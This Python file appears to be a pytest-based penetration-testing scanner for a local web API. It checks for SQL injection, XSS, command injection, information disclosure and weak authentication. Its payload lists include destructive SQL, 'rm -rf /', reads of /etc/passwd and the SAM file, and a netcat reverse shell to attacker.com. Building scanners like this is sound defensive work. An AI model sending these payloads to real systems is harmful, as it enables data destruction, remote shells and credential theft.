"""
Security penetration testing framework.

This module provides comprehensive security testing for API endpoints,
authentication mechanisms, and common web vulnerabilities.
"""

import asyncio
import re
import time
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin

import httpx
import pytest


class SecurityPenetrationTester:
    """Comprehensive security penetration testing framework."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = httpx.Client(timeout=30.0)
        self.vulnerabilities = []
        self.test_payloads = self._load_test_payloads()

    def _load_test_payloads(self) -> Dict[str, List[str]]:
        """Load various attack payloads for testing."""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin'--",
                "' OR 1=1 --",
                "'; UPDATE users SET password='hacked' WHERE id=1 --",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')></iframe>",
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "; rm -rf /",
                "$(whoami)",
                "`id`",
                "&& nc -e /bin/sh attacker.com 4444",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            "ldap_injection": [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(uid=*))",
                "*))(|(uid=*",
            ],
        }

    async def test_authentication_security(self) -> List[Dict]:
        """Test authentication and authorization vulnerabilities."""
        vulnerabilities = []

        # Test 1: Brute force protection
        brute_force_result = await self._test_brute_force_protection()
        if brute_force_result:
            vulnerabilities.append(brute_force_result)

        # Test 2: Session management
        session_result = await self._test_session_management()
        if session_result:
            vulnerabilities.append(session_result)

        # Test 3: JWT token security
        jwt_result = await self._test_jwt_security()
        if jwt_result:
            vulnerabilities.append(jwt_result)

        # Test 4: Password policy
        password_result = await self._test_password_policy()
        if password_result:
            vulnerabilities.append(password_result)

        return vulnerabilities

    async def _test_brute_force_protection(self) -> Optional[Dict]:
        """Test brute force attack protection."""
        try:
            login_endpoint = urljoin(self.base_url, "/auth/login")
            failed_attempts = 0

            # Attempt multiple failed logins
            for i in range(10):
                response = await self._async_post(
                    login_endpoint,
                    {"username": f"testuser{i}", "password": "wrongpassword"},
                )

                if response.status_code == 401:
                    failed_attempts += 1
                elif response.status_code == 429:  # Rate limited
                    break

                await asyncio.sleep(0.1)

            # If we can make 10+ failed attempts without rate limiting
            if failed_attempts >= 10:
                return {
                    "type": "brute_force_vulnerability",
                    "severity": "high",
                    "description": "No brute force protection detected",
                    "endpoint": login_endpoint,
                    "failed_attempts": failed_attempts,
                }

        except Exception as e:
            return {
                "type": "test_error",
                "severity": "low",
                "description": f"Brute force test failed: {str(e)}",
            }

        return None

    async def _test_session_management(self) -> Optional[Dict]:
        """Test session management security."""
        try:
            # Test session fixation
            response = await self._async_get(urljoin(self.base_url, "/"))

            # Check for secure session cookies
            cookies = response.cookies
            insecure_cookies = []

            for cookie_name, _ in cookies.items():
                cookie_obj = response.cookies.get(cookie_name)
                if cookie_obj:
                    # Check for HttpOnly flag
                    if not getattr(cookie_obj, "httponly", False):
                        insecure_cookies.append(f"{cookie_name}: Missing HttpOnly")

                    # Check for Secure flag
                    if not getattr(cookie_obj, "secure", False):
                        insecure_cookies.append(f"{cookie_name}: Missing Secure flag")

            if insecure_cookies:
                return {
                    "type": "insecure_session_management",
                    "severity": "medium",
                    "description": "Insecure session cookie configuration",
                    "details": insecure_cookies,
                }

        except Exception as e:
            return {
                "type": "test_error",
                "severity": "low",
                "description": f"Session management test failed: {str(e)}",
            }

        return None

    async def _test_jwt_security(self) -> Optional[Dict]:
        """Test JWT token security."""
        try:
            # Try to get a JWT token
            login_endpoint = urljoin(self.base_url, "/auth/login")
            response = await self._async_post(
                login_endpoint,
                {
                    "username": "admin",
                    "password": "admin",  # Common default credentials
                },
            )

            if response.status_code == 200:
                token_data = response.json()
                token = token_data.get("access_token")

                if token:
                    # Test 1: Algorithm confusion attack
                    # Try to decode JWT with 'none' algorithm
                    headers = {"Authorization": f"Bearer {token}"}

                    # Test 2: Token expiration
                    # Wait and test if expired tokens are accepted
                    time.sleep(1)

                    protected_endpoint = urljoin(self.base_url, "/auth/me")
                    response = await self._async_get(
                        protected_endpoint, headers=headers
                    )

                    # Additional JWT security tests would go here

        except Exception as e:
            return {
                "type": "test_error",
                "severity": "low",
                "description": f"JWT security test failed: {str(e)}",
            }

        return None

    async def _test_password_policy(self) -> Optional[Dict]:
        """Test password policy enforcement."""
        try:
            register_endpoint = urljoin(self.base_url, "/auth/register")
            weak_passwords = ["123", "password", "admin", "test", "123456789"]

            accepted_weak_passwords = []

            for weak_password in weak_passwords:
                response = await self._async_post(
                    register_endpoint,
                    {
                        "username": f"testuser_{weak_password}",
                        "password": weak_password,
                        "email": f"test_{weak_password}@example.com",
                    },
                )

                if response.status_code in [200, 201]:
                    accepted_weak_passwords.append(weak_password)

            if accepted_weak_passwords:
                return {
                    "type": "weak_password_policy",
                    "severity": "medium",
                    "description": "Weak passwords accepted",
                    "weak_passwords": accepted_weak_passwords,
                }

        except Exception as e:
            return {
                "type": "test_error",
                "severity": "low",
                "description": f"Password policy test failed: {str(e)}",
            }

        return None

    async def test_injection_vulnerabilities(self) -> List[Dict]:
        """Test for various injection vulnerabilities."""
        vulnerabilities = []

        # Test SQL injection
        sql_vulns = await self._test_sql_injection()
        vulnerabilities.extend(sql_vulns)

        # Test XSS
        xss_vulns = await self._test_xss()
        vulnerabilities.extend(xss_vulns)

        # Test command injection
        cmd_vulns = await self._test_command_injection()
        vulnerabilities.extend(cmd_vulns)

        return vulnerabilities

    async def _test_sql_injection(self) -> List[Dict]:
        """Test for SQL injection vulnerabilities."""
        vulnerabilities = []

        # Common endpoints that might be vulnerable
        test_endpoints = [
            "/api/v1/customers",
            "/api/v1/products",
            "/api/v1/orders",
            "/api/v1/analytics",
        ]

        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)

            for payload in self.test_payloads["sql_injection"]:
                try:
                    # Test GET parameters
                    response = await self._async_get(f"{url}?id={payload}")

                    if self._detect_sql_injection_response(response):
                        vulnerabilities.append(
                            {
                                "type": "sql_injection",
                                "severity": "critical",
                                "endpoint": url,
                                "parameter": "id",
                                "payload": payload,
                                "method": "GET",
                            }
                        )

                    # Test POST data
                    response = await self._async_post(url, {"search": payload})

                    if self._detect_sql_injection_response(response):
                        vulnerabilities.append(
                            {
                                "type": "sql_injection",
                                "severity": "critical",
                                "endpoint": url,
                                "parameter": "search",
                                "payload": payload,
                                "method": "POST",
                            }
                        )

                except Exception:
                    continue

        return vulnerabilities

    def _detect_sql_injection_response(self, response: httpx.Response) -> bool:
        """Detect SQL injection vulnerability from response."""
        if not response:
            return False

        # Check for SQL error messages
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "ORA-01756",
            "Microsoft OLE DB Provider",
            "PostgreSQL query failed",
            "Warning: mysql_",
            "valid MySQL result",
            "MySqlClient.",
        ]

        response_text = response.text.lower()
        return any(error in response_text for error in sql_errors)

    async def _test_xss(self) -> List[Dict]:
        """Test for Cross-Site Scripting vulnerabilities."""
        vulnerabilities = []

        test_endpoints = ["/api/v1/search", "/api/v1/feedback", "/api/v1/comments"]

        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)

            for payload in self.test_payloads["xss"]:
                try:
                    # Test reflected XSS
                    response = await self._async_get(f"{url}?q={payload}")

                    if payload in response.text:
                        vulnerabilities.append(
                            {
                                "type": "reflected_xss",
                                "severity": "high",
                                "endpoint": url,
                                "payload": payload,
                                "method": "GET",
                            }
                        )

                    # Test stored XSS via POST
                    response = await self._async_post(url, {"content": payload})

                    if response.status_code in [200, 201]:
                        # Check if payload is stored and reflected
                        get_response = await self._async_get(url)
                        if payload in get_response.text:
                            vulnerabilities.append(
                                {
                                    "type": "stored_xss",
                                    "severity": "critical",
                                    "endpoint": url,
                                    "payload": payload,
                                    "method": "POST",
                                }
                            )

                except Exception:
                    continue

        return vulnerabilities

    async def _test_command_injection(self) -> List[Dict]:
        """Test for command injection vulnerabilities."""
        vulnerabilities = []

        test_endpoints = [
            "/api/v1/system/ping",
            "/api/v1/utils/resolve",
            "/api/v1/tools/whois",
        ]

        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)

            for payload in self.test_payloads["command_injection"]:
                try:
                    response = await self._async_post(url, {"target": payload})

                    if self._detect_command_injection_response(response, payload):
                        vulnerabilities.append(
                            {
                                "type": "command_injection",
                                "severity": "critical",
                                "endpoint": url,
                                "payload": payload,
                            }
                        )

                except Exception:
                    continue

        return vulnerabilities

    def _detect_command_injection_response(
        self, response: httpx.Response, payload: str
    ) -> bool:
        """Detect command injection vulnerability from response."""
        if not response:
            return False

        # Look for command execution indicators
        indicators = [
            "uid=",
            "gid=",  # id command output
            "total ",
            "drw",  # ls command output
            "root:x:0:0",  # /etc/passwd content
            "bin/bash",  # shell references
        ]

        response_text = response.text.lower()
        return any(indicator in response_text for indicator in indicators)

    async def test_information_disclosure(self) -> List[Dict]:
        """Test for information disclosure vulnerabilities."""
        vulnerabilities = []

        # Test for sensitive file access
        sensitive_files = [
            "/.env",
            "/config.yaml",
            "/docker-compose.yml",
            "/.git/config",
            "/backup.sql",
            "/debug.log",
        ]

        for file_path in sensitive_files:
            url = urljoin(self.base_url, file_path)
            try:
                response = await self._async_get(url)

                if response.status_code == 200 and len(response.text) > 0:
                    vulnerabilities.append(
                        {
                            "type": "information_disclosure",
                            "severity": "medium",
                            "description": f"Sensitive file accessible: {file_path}",
                            "url": url,
                        }
                    )

            except Exception:
                continue

        # Test debug information in error responses
        error_endpoints = ["/api/v1/nonexistent", "/api/v1/error/500", "/api/v1/debug"]

        for endpoint in error_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = await self._async_get(url)

                if self._detect_debug_information(response):
                    vulnerabilities.append(
                        {
                            "type": "debug_information_disclosure",
                            "severity": "low",
                            "description": "Debug information exposed in error response",
                            "endpoint": url,
                        }
                    )

            except Exception:
                continue

        return vulnerabilities

    def _detect_debug_information(self, response: httpx.Response) -> bool:
        """Detect debug information in response."""
        if not response:
            return False

        debug_indicators = [
            "traceback",
            "stack trace",
            "debug mode",
            "file not found",
            "internal server error",
            "__file__",
            "line \\d+",
            "exception",
        ]

        response_text = response.text.lower()
        return any(
            re.search(indicator, response_text) for indicator in debug_indicators
        )

    async def _async_get(
        self, url: str, headers: Optional[Dict] = None
    ) -> httpx.Response:
        """Make async GET request."""
        try:
            return await asyncio.to_thread(self.session.get, url, headers=headers or {})
        except Exception as e:
            # Return mock response for failed requests
            return httpx.Response(
                status_code=500,
                content=f"Request failed: {str(e)}",
                request=httpx.Request("GET", url),
            )

    async def _async_post(
        self, url: str, data: Dict, headers: Optional[Dict] = None
    ) -> httpx.Response:
        """Make async POST request."""
        try:
            return await asyncio.to_thread(
                self.session.post, url, json=data, headers=headers or {}
            )
        except Exception as e:
            # Return mock response for failed requests
            return httpx.Response(
                status_code=500,
                content=f"Request failed: {str(e)}",
                request=httpx.Request("POST", url),
            )

    async def run_comprehensive_scan(self) -> Dict:
        """Run comprehensive penetration test scan."""
        print("🔍 Starting comprehensive security penetration test...")

        all_vulnerabilities = []

        # Run all test categories
        auth_vulns = await self.test_authentication_security()
        all_vulnerabilities.extend(auth_vulns)

        injection_vulns = await self.test_injection_vulnerabilities()
        all_vulnerabilities.extend(injection_vulns)

        info_disclosure_vulns = await self.test_information_disclosure()
        all_vulnerabilities.extend(info_disclosure_vulns)

        # Generate report
        return self._generate_penetration_report(all_vulnerabilities)

    def _generate_penetration_report(self, vulnerabilities: List[Dict]) -> Dict:
        """Generate comprehensive penetration test report."""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        vulnerability_types = {}

        for vuln in vulnerabilities:
            severity = vuln.get("severity", "low")
            if severity in severity_counts:
                severity_counts[severity] += 1

            vuln_type = vuln.get("type", "unknown")
            vulnerability_types[vuln_type] = vulnerability_types.get(vuln_type, 0) + 1

        risk_score = (
            severity_counts["critical"] * 10
            + severity_counts["high"] * 5
            + severity_counts["medium"] * 2
            + severity_counts["low"] * 1
        )

        return {
            "scan_timestamp": datetime.now().isoformat(),
            "total_vulnerabilities": len(vulnerabilities),
            "severity_breakdown": severity_counts,
            "vulnerability_types": vulnerability_types,
            "risk_score": min(risk_score, 100),
            "vulnerabilities": vulnerabilities,
            "recommendations": self._generate_security_recommendations(vulnerabilities),
        }

    def _generate_security_recommendations(
        self, vulnerabilities: List[Dict]
    ) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []

        if not vulnerabilities:
            recommendations.append(
                "✅ No security vulnerabilities found in penetration test"
            )
            return recommendations

        # Group recommendations by vulnerability type
        vuln_types = {vuln.get("type", "") for vuln in vulnerabilities}

        if "sql_injection" in vuln_types:
            recommendations.append(
                "🛡️ Implement parameterized queries to prevent SQL injection"
            )

        if "xss" in vuln_types:
            recommendations.append(
                "🧹 Implement input validation and output encoding for XSS prevention"
            )

        if "command_injection" in vuln_types:
            recommendations.append(
                "⚠️ Avoid system command execution or use strict input validation"
            )

        if "brute_force_vulnerability" in vuln_types:
            recommendations.append(
                "🔒 Implement rate limiting and account lockout mechanisms"
            )

        if "information_disclosure" in vuln_types:
            recommendations.append(
                "🔐 Restrict access to sensitive files and disable debug mode in production"
            )

        recommendations.extend(
            [
                "🔄 Conduct regular security assessments",
                "📚 Implement security awareness training for developers",
                "🛠️ Use automated security scanning in CI/CD pipeline",
                "📋 Establish incident response procedures",
                "🔍 Monitor for suspicious activities and failed authentication attempts",
            ]
        )

        return recommendations


class TestSecurityPenetration:
    """Test cases for security penetration testing."""

    @pytest.fixture
    def tester(self):
        """Create penetration tester instance."""
        return SecurityPenetrationTester()

    @pytest.fixture
    def mock_client(self):
        """Create mock test client for API testing."""
        # This would be replaced with actual FastAPI test client
        from unittest.mock import Mock

        return Mock()

    @pytest.mark.asyncio
    async def test_authentication_security_scan(self, tester):
        """Test authentication security scanning."""
        vulnerabilities = await tester.test_authentication_security()

        assert isinstance(vulnerabilities, list)
        # Vulnerabilities may or may not be found - that's expected

    @pytest.mark.asyncio
    async def test_injection_vulnerability_scan(self, tester):
        """Test injection vulnerability scanning."""
        vulnerabilities = await tester.test_injection_vulnerabilities()

        assert isinstance(vulnerabilities, list)
        # Test should complete without errors

    @pytest.mark.asyncio
    async def test_information_disclosure_scan(self, tester):
        """Test information disclosure scanning."""
        vulnerabilities = await tester.test_information_disclosure()

        assert isinstance(vulnerabilities, list)
        # Test should complete without errors

    def test_sql_injection_detection(self, tester):
        """Test SQL injection response detection."""
        # Mock response with SQL error
        from unittest.mock import Mock

        sql_error_response = Mock()
        sql_error_response.text = "MySQL error: You have an error in your SQL syntax"

        assert tester._detect_sql_injection_response(sql_error_response)

        clean_response = Mock()
        clean_response.text = "Normal response content"

        assert not tester._detect_sql_injection_response(clean_response)

    def test_command_injection_detection(self, tester):
        """Test command injection response detection."""
        from unittest.mock import Mock

        cmd_response = Mock()
        cmd_response.text = "uid=0(root) gid=0(root) groups=0(root)"

        assert tester._detect_command_injection_response(cmd_response, "; id")

        clean_response = Mock()
        clean_response.text = "Normal response content"

        assert not tester._detect_command_injection_response(clean_response, "; id")

    def test_debug_information_detection(self, tester):
        """Test debug information detection."""
        from unittest.mock import Mock

        debug_response = Mock()
        debug_response.text = "Traceback (most recent call last): File test.py, line 10"

        assert tester._detect_debug_information(debug_response)

        clean_response = Mock()
        clean_response.text = "Clean error message"

        assert not tester._detect_debug_information(clean_response)

    @pytest.mark.asyncio
    async def test_comprehensive_penetration_scan(self, tester):
        """Test comprehensive penetration scanning."""
        report = await tester.run_comprehensive_scan()

        # Validate report structure
        required_fields = [
            "scan_timestamp",
            "total_vulnerabilities",
            "severity_breakdown",
            "vulnerability_types",
            "risk_score",
            "vulnerabilities",
            "recommendations",
        ]

        for field in required_fields:
            assert field in report

        assert isinstance(report["total_vulnerabilities"], int)
        assert isinstance(report["risk_score"], (int, float))
        assert isinstance(report["vulnerabilities"], list)
        assert isinstance(report["recommendations"], list)

    def test_penetration_report_generation(self, tester):
        """Test penetration test report generation."""
        mock_vulnerabilities = [
            {"type": "sql_injection", "severity": "critical"},
            {"type": "xss", "severity": "high"},
            {"type": "info_disclosure", "severity": "medium"},
        ]

        report = tester._generate_penetration_report(mock_vulnerabilities)

        assert report["total_vulnerabilities"] == 3
        assert report["severity_breakdown"]["critical"] == 1
        assert report["severity_breakdown"]["high"] == 1
        assert report["severity_breakdown"]["medium"] == 1
        assert report["risk_score"] == 17  # 1*10 + 1*5 + 1*2


if __name__ == "__main__":
    # Command-line execution for standalone penetration testing
    async def main():
        """Main function for standalone execution."""
        tester = SecurityPenetrationTester()
        report = await tester.run_comprehensive_scan()

        print("\n🛡️ Security Penetration Test Report")
        print("=" * 60)
        print(f"Scan Time: {report['scan_timestamp']}")
        print(f"Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"Risk Score: {report['risk_score']}/100")

        print("\n🔢 Severity Breakdown:")
        for severity, count in report["severity_breakdown"].items():
            if count > 0:
                print(f"  {severity.capitalize()}: {count}")

        print("\n🎯 Vulnerability Types:")
        for vuln_type, count in report["vulnerability_types"].items():
            print(f"  {vuln_type.replace('_', ' ').title()}: {count}")

        print("\n💡 Security Recommendations:")
        for rec in report["recommendations"]:
            print(f"  {rec}")

        if report["vulnerabilities"]:
            print("\n⚠️ Detailed Vulnerabilities:")
            for vuln in report["vulnerabilities"][:5]:  # Show first 5
                print(
                    f"  - {vuln.get('type', 'Unknown')}: {vuln.get('description', 'No description')}"
                )

    asyncio.run(main())
